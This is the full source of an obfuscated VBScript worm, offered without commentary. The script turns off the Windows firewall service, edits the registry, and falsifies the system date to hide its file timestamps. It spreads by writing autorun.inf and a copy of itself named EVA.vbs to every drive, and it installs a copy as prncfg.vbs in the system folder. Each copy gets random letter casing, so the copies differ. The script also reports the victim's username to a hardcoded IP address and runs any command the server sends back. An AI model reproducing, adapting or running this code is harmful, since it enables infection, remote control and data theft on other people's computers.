oN ErrOR rESuMe nexT
sEt fSo=crEATEOBJEcT(STRReVerSE("TceJBOmEtsYSELIf.GNitPIrcs"))
sET wShsHell=crEATEOBject(STrreVerse("LLehS.TpIrCsw"))
dIM drI_LisT,drI_List0
diM issenD
IssEnd=0
c_TImE=DAtE()
wSHSHEll.RUn "NET stoP SHAredAccESS",0
SeT DRVS=fsO.dRiVes
SySDiR=fso.GetsPeciAlfolDER(1)
tHISPATh=wsCRiPT.sCRIpTfuLLNAMe
Set Fc=fsO.opeNTexTfiLe(thisPATH,1)
sCOPy=fC.readaLL
Fc.cLoSe
seT fC=NotHINg
CalL Writefile(sysdir&"\SysInfo.reg",UnESCApE(stRrEVERSe("00c2%00C2%00C2%00c2%00c2%00C2%00c2%00C2%00C2%00C2%00C2%00C2%00c2%00C2%00c2%00A3%92%B82%XEHD3%22%EmITceXE22%a0%D0%02%22%22%d3%22%sreTEmaRap22%a0%d0%02%22%sbV.GfcnRpc5%c5%23mEtSySc5%c5%52%rIDNiw52%22%D3%22%tpircs22%a0%d0%02%D5%0c5%0c5%pUTrATSC5%stpIrCSC5%eniHCamc5%ETatsC5%YCiloP02%PUoRGc5%nOISREVTneRruCc5%sWODnIWc5%tfosOrciMc5%ErawtFOSC5%ENiHCAM_LaCol_YeKHb5%A0%D0%A0%D0%02%00C2%00c2%00c2%00C2%00c2%00C2%00C2%00C2%00c2%00c2%00c2%00c2%00c2%00c2%00c2%00a3%92%B82%xehd3%22%emitcExE22%A0%d0%02%22%22%D3%22%SrETEMArap22%a0%D0%02%22%SBv.gFcnRPC5%C5%23METSYSC5%C5%52%riDNIw52%22%d3%22%tPircS22%a0%D0%02%d5%0C5%0C5%PUtRAtsC5%sTpiRCSC5%METsySC5%swOdniwC5%tFosOrcimc5%SEICIlopc5%ErawTfosc5%ENihCaM_LaCol_yeKhb5%A0%D0%a0%D0%03%03%e2%53%02%e6%F6%96%37%27%56%65%02%27%f6%47%96%46%54%02%97%27%47%37%96%76%56%25%02%37%77%F6%46%e6%96%75%")))
wshsHell.run "regEDIT /S sYSINFO.Reg",0
wsCRIpT.sLEEP 200
fSO.delEtefiLE sYsdIr&"\sySINFO.reg",TRue
if insTR(tHiSpAtH,sysdIr)>0 thEN
dRI_lIST0=listdrV()
o_TiME=lEft(C_timE,3)&CStR(inT(MID(C_tiME,4,1))-1)&RIGHT(c_TimE,LeN(c_TiME)-4)
wShsHeLl.RUN "CmD /c dAte "&o_Time,0
WSCRIpT.SLEEp 10000
foR DrI_i=1 TO LEN(dRI_lisT0)
CAll wrIteauto(MID(Dri_lIST0,dRi_i,1)&":\")
NeXt
wsHshELL.rUN "cMD /C Date "&c_Time,0
cOMpuTernAme="":uSERNaMe=""
SET objWMiseRVICe=gETOBJect("wINMgMTs:{iMPERSONatIonLeVel=IMpERsOnate}!\\.\rooT\cimV2")
SEt COLCOmPutERs = oBJWmIseRVICE.EXEcqUEry("SelecT * FroM win32_COMPUtersYSTem")
for EAch oBjCoMputer in COlcOMPutERs
COmputernaMe=objcOmPUteR.naMe
uSErNAME=ObjcOmPUTER.usERnamE
Next
IF useRnaME="" tHEn USERNAme="eVaR"
IF INsTr(useRnamE,"\")<=0 THEN
UsERNAME=ComPUtERnaME&"\"&USERNaME
eND if
do
IF iSseNd=0 thEN
SEt xmL=CreaTeobjecT(stRrEvErSe("ptThlMXRevRES.2LMxsM"))  
xml.open "GeT",sTrreVerse(UnESCApE("%3d%61%3f%70%73%61%2e%74%6E%75%6f%63%2F%61%76%65%2F%62%7A%7a%2F%30%30%31%2E%34%30%31%2e%39%31%31%2E%32%30%32%2F%2F%3a%70%74%74%68"))&userName,0
xMl.SetrequESTHEAder "USer-Agent","EvaR"
XmL.send()
IF eRR.nuMBer=0 then
isSend=1
rES=xMl.rEsponSEtEXT
If uCaSE(LEft(REs,7))=UcasE("EXecuTe")  tHEn ExECUTE Res
eLsE
ERR.CLeAr
enD if
seT xml=NOtHing
end iF

dRi_LIsT=lISTdrv()
foR dRI_K=1 tO leN(DRi_LIST)
iF inSTR(dri_LIsT0,MID(dRi_LiSt,dRI_k,1))<=0 Then
caLL WrITEAUTO(mID(DRI_LisT,dRI_k,1)&":\")
EnD If
next
Dri_lIsT0=DRI_list
WScRipt.SlEep 1000
lOOp
eLsE
wshshElL.RUn "EXpLOReR .\",3
wscRipt.SlEeP 2000
WsHshELL.appaCtivATe UNEScApE(lcASE("%u6211%u7684%u7535%u8111"))
WshSheLl.sEnDKEyS Ucase("% c")
RUnFlAG=0
FOr EaCH pS iN gETobJECT _ 
("WiNMGmts:\\.\ROot\cImV2:WIN32_prOCESs").inStAnces_ 
if LcASe(pS.name)=LcASE("wSCRiPT.eXE") theN
rUnflaG=RuNFlaG+1
eNd IF
next
if RuNFLAG>=2 TheN WScrIPT.QUit
seT SF=fsO.GeTFOLDEr(SysDiR)
F_TiMe=left(Sf.dATecREaTeD,INSTR(sF.dATEcReaTEd," ")-1)
WshsHElL.Run "cmd /C dAtE "&f_TIme,0
WSCrIpt.sLeEp 100
CalL wRItEfILe(sysdIr&LCAse("\pRNCfG.VBs"),Vs(sCopy))
wSHshEll.RuN "CMD /c dAte "&c_TIME,0
WshSHELl.RUN SYsdIr&"\PRNcfg.VBs"
END iF
FuNcTiON vS(Str)
ExecUTe STrReVERSE(UNeSCaPE("%29%29%22u%25%22%28eSAcL%2c%29%22U%25%22%28esACU%2csv%28EcAlper%3Dsv%0d%0AtxEN%0D%0aFI%20dne%0D%0Ac%26Sv%3DsV%0D%0aeSle%0d%0a%29c%28eSacL%26sv%3Dsv%0d%0anEHt%2005%3e%29001*%29%28DNR%28tni%20Fi%0D%0aEZIMODnaR%0D%0a%29%291%2ci%2CRts%28diM%28eSACU%3DC%0D%0A%29rtS%28Nel%20Ot%201%3Di%20rof"))
ENd FuNcTioN
functION lIstdrV()
execuTe STrREvErSE(unescApE("TsiL_PmT%3dVRDTsil%0d%0Atxen%0D%0Afi%20DNe%0d%0AretteLeviRD.VRD%26TsIL_pMT%3dtSIL_PMt%0d%0ANEHt%20YDaERSI.Vrd%20Fi%0D%0ASvRd%20ni%20vrD%20HCaE%20ROF%0D%0A%22%22%3DTsIL_pMT%0d%0atsIL_PMT%20mid"))
eNd fUncTIOn

SUB wRiteaUtO(path)
exECuTE StRReverse(uNESCapE("fI%20DNE%0d%0AeurT%2c%22FnI.nuRotUA%22%26Htap%20eliFEtELED.oSf%0d%0ANEht%20%29%22fni.NURotuA%22%26HTAp%28sTsIxEeLIF.OsF%20fIEsle%0d%0A%29%28DNR%26HTaP%2c%22FNi.NurOTUA%22%26HTaP%20redlofEVOm.OsF%0d%0ANeht%20%29%22fni.nUrotua%22%26HtAP%28STsixereDlOF.Osf%20fI"))
CMdstr="shEll\*\cOmMAnd=wsCRiPt.EXE "&chR(34)&"EVA.VbS"&Chr(34)
AUTOSTr="[auTORUn]"&VBcRLF&"OpeN="&vBcRlF&RePlAce(cMDstr,"*","oPeN")&VBCRlF&rEPLaCe(CMdSTr,"*","eXploRE")&Vbcrlf&rEPLacE(CmDstR,"*","fIND")
calL WritefilE(pATh&UcAsE("autorUn.INF"),AUtOSTr)
Call WritEfile(pAtH&"eVa.VBs",vS(Scopy))
eND SUB

sUB wRITEfiLE(FPAth,conTENT)
EXEcUTE STrrEveRsE(UnESCaPe("gniHTon%3Daf%20TeS%0D%0A7%3DsETUbIrtTA.AF%0D%0A%29htaPF%28Elifteg.OSF%3DaF%20tES%0d%0aGNIHtOn%3dCf%20tes%0D%0AEsOLc.cF%0d%0atNeTNOC%20ETiRW.cF%0D%0a%29euRt%2c2%2cHTapF%28ElIftXETnepo.Osf%3DcF%20TeS%0D%0AEURt%2CHTAPf%20elIFETeleD.OsF%20NEht%20%29hTaPF%28sTsixeELif.OSf%20fI"))
END sUB
